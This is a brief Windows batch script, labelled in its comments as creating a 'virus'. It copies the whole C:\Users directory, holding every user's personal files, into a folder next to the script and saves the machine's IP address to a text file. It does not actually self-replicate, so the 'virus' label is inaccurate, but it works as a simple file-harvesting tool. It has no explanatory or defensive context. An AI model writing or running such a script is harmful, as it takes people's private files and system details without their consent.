@echo off

REM Creating virus
set source=C:\Users
set destination=%~dp0\virus

echo Creating virus from %source% to %destination%...
xcopy /s /e /i %source% %destination%
echo Virus created.

REM Get current IP address
for /f "tokens=2 delims=:" %%a in ('ipconfig ^| findstr /c:"IPv4 Address"') do (
    echo %%a >> "%~dp0ip_address.txt"
)

echo IP address saved to "%~dp0ip_address.txt"

pause
